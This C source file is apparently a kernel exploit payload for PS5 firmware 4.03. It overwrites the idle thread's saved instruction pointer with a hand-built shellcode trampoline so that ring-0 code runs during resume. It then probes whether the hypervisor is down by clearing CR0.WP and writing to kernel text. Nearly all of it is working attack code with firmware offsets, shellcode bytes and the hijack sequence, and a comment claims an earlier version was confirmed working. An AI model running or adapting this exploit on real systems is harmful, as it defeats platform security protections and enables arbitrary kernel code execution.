#include <stdint.h>

/*
 * pcb_overwrite v3 — HV probe via idle PCB hijack
 *
 * === v2 CONFIRMED WORKING 2026-03-07 ===
 *   Trampoline executed on resume, wrote sentinel, jumped to sw_return.
 *   Kernel resumed cleanly. Arbitrary code execution via PCB hijack proven.
 *
 * v3 GOAL — PROBE HYPERVISOR STATE DURING RESUME:
 *   The hypothesis (from PS5 security research): during suspend/resume,
 *   code that runs early enough in the resume path executes BEFORE the
 *   hypervisor restarts. In this window:
 *     - CR0.WP can be cleared (HV normally intercepts this)
 *     - Ktext is writable (HV's NPT normally blocks this)
 *     - Kernel patches can be applied before HV re-establishes protections
 *
 *   v3 tests this by having the resume trampoline:
 *     1. Write HJK_RAN! sentinel (proof of execution, same as v2)
 *     2. Snapshot CR0, CR4, EFER
 *     3. Attempt to clear CR0.WP
 *     4. If WP cleared: attempt to write 8 bytes to ktext, verify, restore
 *     5. Record all results to kdata for phase 2 verification
 *
 *   The trampoline is a small asm stub that calls a compiled C function
 *   (hv_probe), then jumps to sw_return for clean kernel resumption.
 *
 * PHASES:
 *   fw_ver=0x403: Phase 1 — Build HV probe trampoline, overwrite pcb_rip
 *   fw_ver=0x2:   Phase 2 — Verify post-resume: sentinels + HV probe results
 *   fw_ver=0x3:   Phase 1 DRY RUN — snapshot only, NO writes
 *
 * Output layout — Phase 1 (ARM):
 *   [0]   magic "PCBO" (0x5043424F) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase (1 = armed, 3 = dry run)
 *
 *   --- addresses ---
 *   [4]   pcpu0
 *   [5]   idlethread
 *   [6]   idle_pcb
 *   [7]   stub address (trampoline entry point)
 *   [8]   original pcb_rip (sw_return)
 *   [9]   original pcb_rsp
 *   [10]  exec_code base
 *   [11]  hv_probe function address
 *
 *   --- idle PCB snapshot (8 key fields) ---
 *   [12]  pcb_r15
 *   [13]  pcb_r14
 *   [14]  pcb_r13
 *   [15]  pcb_r12
 *   [16]  pcb_rbp
 *   [17]  pcb_rsp
 *   [18]  pcb_rbx
 *   [19]  pcb_rip
 *
 *   --- pcb_rip overwrite ---
 *   [20]  pcb_rip BEFORE overwrite
 *   [21]  pcb_rip AFTER overwrite (readback)
 *   [22]  overwrite target (stub addr)
 *
 *   --- metadata ---
 *   [24]  sentinel address (kdata+0x400)
 *   [25]  0 (sentinel not yet set)
 *   [26]  sw_return address
 *   [27]  stub size (bytes)
 *   [28]  ktext probe address
 *   [29]  hv_probe function address
 *
 *   [30]  sentinel 0xdeadbeefcafe00BB
 *
 * Output layout — Phase 2 (VERIFY):
 *   [0]   magic "PCBO" (0x5043424F) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase (2)
 *
 *   --- post-resume state ---
 *   [4]   pcpu0
 *   [5]   curthread (post-resume)
 *   [6]   idlethread
 *   [7]   idle_pcb
 *
 *   --- current idle PCB (8 key fields) ---
 *   [10]  pcb_r15
 *   [11]  pcb_r14
 *   [12]  pcb_r13
 *   [13]  pcb_r12
 *   [14]  pcb_rbp
 *   [15]  pcb_rsp
 *   [16]  pcb_rbx
 *   [17]  pcb_rip
 *
 *   --- kdata persistence checks ---
 *   [20]  kdata+0x400 sentinel (should be HIJACK_SENTINEL if trampoline ran!)
 *   [21]  kdata+0x200 snap_magic (from pcb_diff, if still there)
 *
 *   --- pcb_rip analysis ---
 *   [24]  pre-overwrite pcb_rip (from kdata+0x410 backup)
 *   [25]  current pcb_rip
 *   [26]  sw_return address (computed)
 *   [27]  verdict:
 *         1 = FULL SUCCESS: sentinel + pcb_rip restored
 *         2 = pcb_rip restored but sentinel missing
 *         3 = trampoline addr still in pcb_rip
 *         4 = unexpected pcb_rip value
 *
 *   --- HV probe results (v3) ---
 *   [32]  CR0 before WP clear attempt
 *   [33]  CR4
 *   [34]  CR0 after WP clear attempt
 *   [35]  ktext probe address
 *   [36]  ktext original value (8 bytes read before write)
 *   [37]  ktext readback value (8 bytes read after write attempt)
 *   [38]  HV result code:
 *         1 = WP cleared + ktext writable → NO HV (full success!)
 *         2 = WP stuck → HV active (intercepting CR0 writes)
 *         3 = WP cleared but ktext write failed → NPT still active?
 *   [39]  EFER MSR value
 *
 *   [30]  sentinel 0xdeadbeefcafe00CC
 */

#define MAGIC_PCBO       0x5043424F  /* "PCBO" */
#define HIJACK_SENTINEL  0x484A4B5F52414E21ULL  /* "HJK_RAN!" */

/* FW 4.03 offsets */
#define PCPU_ARRAY_OFF       0x64d2280
#define SW_RETURN_OFF        (-0x5A16AB)   /* sw_return relative to kdata_base */

/* pcpu offsets */
#define PC_CURTHREAD     0x00
#define PC_IDLETHREAD    0x08

/* thread / PCB offsets */
#define TD_PCB           0x3f8
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38

/* kdata persistence locations */
#define KDATA_SENT_OFF       0x400   /* sentinel — trampoline writes here */
#define KDATA_BACKUP_OFF     0x410   /* backup of original pcb_rip + stub addr */

/* v3 HV probe result locations in kdata */
#define KDATA_CR0_BEFORE     0x420
#define KDATA_CR4_VAL        0x428
#define KDATA_CR0_AFTER_WP   0x430
#define KDATA_KTEXT_PROBE    0x438
#define KDATA_KTEXT_ORIG     0x440
#define KDATA_KTEXT_READBACK 0x448
#define KDATA_HV_RESULT      0x450
#define KDATA_EFER_VAL       0x458

/* HV probe result codes */
#define HV_WP_CLEARED_KTEXT_RW    1  /* WP cleared AND ktext writable → NO HV */
#define HV_WP_STUCK               2  /* CR0.WP stuck → HV intercepting */
#define HV_WP_CLEARED_KTEXT_RO    3  /* WP cleared but ktext write failed */

#define CR0_WP  (1ULL << 16)
#define MIN_KERN_ADDR    0xFFFF800000000000ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
    uint32_t data_size;
    uint64_t exec_code;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t readcr0(void)
{
    uint64_t v;
    __asm__ volatile("mov %%cr0, %0" : "=r"(v));
    return v;
}

static inline void writecr0(uint64_t v)
{
    __asm__ volatile("mov %0, %%cr0" :: "r"(v) : "memory");
}

static inline uint64_t readcr4(void)
{
    uint64_t v;
    __asm__ volatile("mov %%cr4, %0" : "=r"(v));
    return v;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

/*
 * HV probe function — called from trampoline stub during resume.
 * Runs at ring 0 in cpu_switch context on the BSP.
 *
 * Tests whether the hypervisor is active by:
 * 1. Attempting to clear CR0.WP (HV intercepts this when active)
 * 2. If WP cleared, attempting to write to ktext (NPT blocks when active)
 *
 * During resume, if the HV hasn't restarted yet:
 *   - No VMCB is loaded, no SVM intercepts active
 *   - CR0 writes execute natively (WP can be cleared)
 *   - No nested page tables → only guest PTEs matter
 *   - With WP=0, supervisor writes bypass PTE R/W checks
 *   - Ktext IS writable
 *
 * All results stored to kdata+0x420..0x458.
 */
static void __attribute__((noinline, used))
hv_probe(uint64_t kdata_base, uint64_t ktext_probe_addr)
{
    /* 1. Write sentinel — proof we ran (same as v2) */
    write8(kdata_base + KDATA_SENT_OFF, HIJACK_SENTINEL);

    /* 2. Snapshot control registers */
    uint64_t cr0 = readcr0();
    uint64_t cr4 = readcr4();
    uint64_t efer = rdmsr(0xC0000080);  /* IA32_EFER */

    write8(kdata_base + KDATA_CR0_BEFORE, cr0);
    write8(kdata_base + KDATA_CR4_VAL, cr4);
    write8(kdata_base + KDATA_EFER_VAL, efer);
    write8(kdata_base + KDATA_KTEXT_PROBE, ktext_probe_addr);

    /* 3. Try to clear CR0.WP
     *
     * If HV is active: this triggers a VMEXIT. The HV's CR0 write handler
     * silently keeps WP=1 and returns. No crash — just blocked.
     *
     * If HV is NOT active: the write executes natively. WP is cleared.
     */
    writecr0(cr0 & ~CR0_WP);

    /* Read back to see if WP actually cleared */
    uint64_t cr0_after = readcr0();
    write8(kdata_base + KDATA_CR0_AFTER_WP, cr0_after);

    if (cr0_after & CR0_WP) {
        /* WP still set → HV intercepted the CR0 write */
        write8(kdata_base + KDATA_HV_RESULT, HV_WP_STUCK);
        write8(kdata_base + KDATA_KTEXT_ORIG, 0);
        write8(kdata_base + KDATA_KTEXT_READBACK, 0);
        /* CR0 unchanged, no need to restore */
        return;
    }

    /*
     * WP CLEARED — HV is NOT intercepting CR0 writes!
     * This strongly suggests the HV hasn't started yet.
     * NPT should be inactive, so ktext writes should succeed.
     */

    /* 4. Read original ktext value */
    uint64_t orig = read8(ktext_probe_addr);
    write8(kdata_base + KDATA_KTEXT_ORIG, orig);

    /* 5. Try to write to ktext (flip LSB — minimal change) */
    uint64_t test_val = orig ^ 1;
    write8(ktext_probe_addr, test_val);

    /* 6. Read back to verify write took effect */
    uint64_t readback = read8(ktext_probe_addr);
    write8(kdata_base + KDATA_KTEXT_READBACK, readback);

    if (readback == test_val) {
        /* SUCCESS — ktext is writable! HV is NOT active! */
        write8(kdata_base + KDATA_HV_RESULT, HV_WP_CLEARED_KTEXT_RW);
        /* Restore original ktext value immediately */
        write8(ktext_probe_addr, orig);
    } else {
        /* WP cleared but ktext write didn't stick — NPT still active? */
        write8(kdata_base + KDATA_HV_RESULT, HV_WP_CLEARED_KTEXT_RO);
    }

    /* 7. Restore CR0 (re-enable WP) */
    writecr0(cr0);
}

/*
 * Build trampoline stub that calls hv_probe() then jumps to sw_return.
 *
 * Shellcode:
 *   movabs rdi, kdata_base         ; 10 bytes  (arg 1)
 *   movabs rsi, ktext_probe_addr   ; 10 bytes  (arg 2)
 *   movabs rax, hv_probe_addr      ; 10 bytes
 *   call   rax                     ; 2 bytes   (FF D0)
 *   movabs rax, sw_return_addr     ; 10 bytes
 *   jmp    rax                     ; 2 bytes   (FF E0)
 *
 * Total: 44 bytes.
 *
 * Register safety:
 *   - rdi, rsi, rax: clobbered (caller-saved, not in PCB)
 *   - hv_probe() is a normal C function: preserves rbx, rbp, r12-r15
 *   - rsp: balanced by call/ret pair
 *   - After stub returns to sw_return: all PCB regs intact
 */
static int build_hv_probe_stub(uint64_t dest, uint64_t kdata_base,
                                uint64_t ktext_probe_addr,
                                uint64_t hv_probe_addr,
                                uint64_t sw_return_addr)
{
    volatile uint8_t* p = (volatile uint8_t*)dest;
    int i = 0;

    /* movabs rdi, kdata_base */
    p[i++] = 0x48; p[i++] = 0xBF;
    for (int b = 0; b < 8; b++) p[i++] = (kdata_base >> (b * 8)) & 0xFF;

    /* movabs rsi, ktext_probe_addr */
    p[i++] = 0x48; p[i++] = 0xBE;
    for (int b = 0; b < 8; b++) p[i++] = (ktext_probe_addr >> (b * 8)) & 0xFF;

    /* movabs rax, hv_probe_addr */
    p[i++] = 0x48; p[i++] = 0xB8;
    for (int b = 0; b < 8; b++) p[i++] = (hv_probe_addr >> (b * 8)) & 0xFF;

    /* call rax */
    p[i++] = 0xFF; p[i++] = 0xD0;

    /* movabs rax, sw_return_addr */
    p[i++] = 0x48; p[i++] = 0xB8;
    for (int b = 0; b < 8; b++) p[i++] = (sw_return_addr >> (b * 8)) & 0xFF;

    /* jmp rax */
    p[i++] = 0xFF; p[i++] = 0xE0;

    return i;  /* 44 */
}

static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
                       uint32_t data_size, volatile uint64_t* out,
                       volatile uint32_t* out32, int dry_run)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t sw_return = kdata_base + SW_RETURN_OFF;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);

    /* Stub location: right after payload code in exec_code buffer */
    uint64_t stub_addr = exec_code + data_size;
    stub_addr = (stub_addr + 15) & ~15ULL;

    /* ktext probe address: use sw_return (known ktext addr with known content) */
    uint64_t ktext_probe_addr = sw_return;

    /* hv_probe function address (PIE: lea-based, correct at runtime) */
    uint64_t probe_fn_addr = (uint64_t)hv_probe;

    /* Header */
    out32[0] = MAGIC_PCBO;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = dry_run ? 3 : 1;

    out[4] = pcpu0;
    out[5] = idlethread;

    /* Get idle PCB */
    uint64_t idle_pcb = 0;
    if (idlethread >= MIN_KERN_ADDR)
        idle_pcb = read8(idlethread + TD_PCB);

    out[6] = idle_pcb;
    out[7] = stub_addr;

    if (idle_pcb < MIN_KERN_ADDR) {
        out32[1] = 0xFE;  /* error: invalid idle_pcb */
        out[30] = 0xdeadbeefcafe00BBULL;
        return;
    }

    /* Read current idle PCB state */
    uint64_t orig_rip = read8(idle_pcb + PCB_RIP);
    uint64_t orig_rsp = read8(idle_pcb + PCB_RSP);

    out[8]  = orig_rip;
    out[9]  = orig_rsp;
    out[10] = exec_code;
    out[11] = probe_fn_addr;

    /* Snapshot 8 key PCB fields */
    out[12] = read8(idle_pcb + PCB_R15);
    out[13] = read8(idle_pcb + PCB_R14);
    out[14] = read8(idle_pcb + PCB_R13);
    out[15] = read8(idle_pcb + PCB_R12);
    out[16] = read8(idle_pcb + PCB_RBP);
    out[17] = read8(idle_pcb + PCB_RSP);
    out[18] = read8(idle_pcb + PCB_RBX);
    out[19] = read8(idle_pcb + PCB_RIP);

    /* Record what we're about to do */
    out[20] = orig_rip;  /* BEFORE */

    if (!dry_run) {
        /* Verify orig_rip looks like sw_return (sanity check) */
        uint64_t expected_sw = kdata_base + SW_RETURN_OFF;
        if (orig_rip != expected_sw) {
            out32[1] = 0xFD;  /* error: unexpected pcb_rip */
            out[21] = orig_rip;
            out[22] = expected_sw;
            out[30] = 0xdeadbeefcafe00BBULL;
            return;
        }

        /* Build HV probe stub in exec_code buffer */
        int ssize = build_hv_probe_stub(stub_addr, kdata_base,
                                         ktext_probe_addr,
                                         probe_fn_addr, sw_return);

        /* Backup original pcb_rip to kdata */
        write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
        write8(kdata_base + KDATA_BACKUP_OFF + 8, stub_addr);

        /* Clear sentinel and all HV probe result slots */
        write8(kdata_base + KDATA_SENT_OFF, 0);
        for (int off = KDATA_CR0_BEFORE; off <= KDATA_EFER_VAL; off += 8)
            write8(kdata_base + off, 0);

        /* === THE OVERWRITE === */
        write8(idle_pcb + PCB_RIP, stub_addr);

        /* Readback to confirm */
        out[21] = read8(idle_pcb + PCB_RIP);
        out[22] = stub_addr;

        out[24] = kdata_base + KDATA_SENT_OFF;
        out[25] = 0;  /* sentinel not yet set */
        out[26] = sw_return;
        out[27] = (uint64_t)ssize;
        out[28] = ktext_probe_addr;
        out[29] = probe_fn_addr;
    } else {
        /* DRY RUN: snapshot only */
        out[21] = orig_rip;
        out[22] = stub_addr;
        out[24] = kdata_base + KDATA_SENT_OFF;
        out[25] = 0;
        out[26] = kdata_base + SW_RETURN_OFF;
        out[27] = 0;
        out[28] = ktext_probe_addr;
        out[29] = probe_fn_addr;
    }

    out[30] = 0xdeadbeefcafe00BBULL;
    out32[1] = 0x0001;
}

static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
                          volatile uint32_t* out32)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t sw_return = kdata_base + SW_RETURN_OFF;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t curthread  = read8(pcpu0 + PC_CURTHREAD);
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);

    /* Header */
    out32[0] = MAGIC_PCBO;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = 2;

    out[4] = pcpu0;
    out[5] = curthread;
    out[6] = idlethread;

    uint64_t idle_pcb = 0;
    if (idlethread >= MIN_KERN_ADDR)
        idle_pcb = read8(idlethread + TD_PCB);

    out[7] = idle_pcb;

    if (idle_pcb < MIN_KERN_ADDR) {
        out32[1] = 0xFE;
        out[30] = 0xdeadbeefcafe00CCULL;
        return;
    }

    /* Read current idle PCB */
    out[10] = read8(idle_pcb + PCB_R15);
    out[11] = read8(idle_pcb + PCB_R14);
    out[12] = read8(idle_pcb + PCB_R13);
    out[13] = read8(idle_pcb + PCB_R12);
    out[14] = read8(idle_pcb + PCB_RBP);
    out[15] = read8(idle_pcb + PCB_RSP);
    out[16] = read8(idle_pcb + PCB_RBX);
    out[17] = read8(idle_pcb + PCB_RIP);

    /* kdata persistence checks */
    uint64_t sentinel = read8(kdata_base + KDATA_SENT_OFF);
    out[20] = sentinel;
    out[21] = read8(kdata_base + 0x200);  /* pcb_diff snap_magic */

    /* pcb_rip analysis */
    uint64_t backed_up_rip = read8(kdata_base + KDATA_BACKUP_OFF);
    uint64_t stub_addr = read8(kdata_base + KDATA_BACKUP_OFF + 8);
    uint64_t current_rip = read8(idle_pcb + PCB_RIP);

    out[24] = backed_up_rip;    /* original sw_return (saved in phase 1) */
    out[25] = current_rip;      /* current pcb_rip */
    out[26] = sw_return;        /* computed sw_return this boot */

    /*
     * Verdict:
     * 1 = pcb_rip restored to sw_return AND sentinel == HIJACK_SENTINEL
     *     → FULL SUCCESS: trampoline ran, wrote sentinel, jumped to sw_return
     * 2 = pcb_rip restored but sentinel missing
     * 3 = pcb_rip still == stub_addr (trampoline hasn't run yet)
     * 4 = unexpected pcb_rip
     */
    if (current_rip == sw_return && sentinel == HIJACK_SENTINEL)
        out[27] = 1;
    else if (current_rip == sw_return)
        out[27] = 2;
    else if (current_rip == stub_addr)
        out[27] = 3;
    else
        out[27] = 4;

    /* v3: Read HV probe results from kdata */
    out[32] = read8(kdata_base + KDATA_CR0_BEFORE);
    out[33] = read8(kdata_base + KDATA_CR4_VAL);
    out[34] = read8(kdata_base + KDATA_CR0_AFTER_WP);
    out[35] = read8(kdata_base + KDATA_KTEXT_PROBE);
    out[36] = read8(kdata_base + KDATA_KTEXT_ORIG);
    out[37] = read8(kdata_base + KDATA_KTEXT_READBACK);
    out[38] = read8(kdata_base + KDATA_HV_RESULT);
    out[39] = read8(kdata_base + KDATA_EFER_VAL);

    out[30] = 0xdeadbeefcafe00CCULL;
    out32[1] = 0x0001;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    uint32_t data_size = args->data_size;
    uint64_t exec_code = args->exec_code;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 280; i++)
        out[i] = 0;

    if (mode == 0x403) {
        phase1_arm(kdata_base, exec_code, data_size, out, out32, 0);
    } else if (mode == 0x3) {
        phase1_arm(kdata_base, exec_code, data_size, out, out32, 1);
    } else if (mode == 0x2) {
        phase2_verify(kdata_base, out, out32);
    } else {
        out32[0] = MAGIC_PCBO;
        out32[1] = 0xFF;
        out[1] = kdata_base;
        out[30] = 0xdeadbeefcafe00BBULL;
    }

    return 0;
}
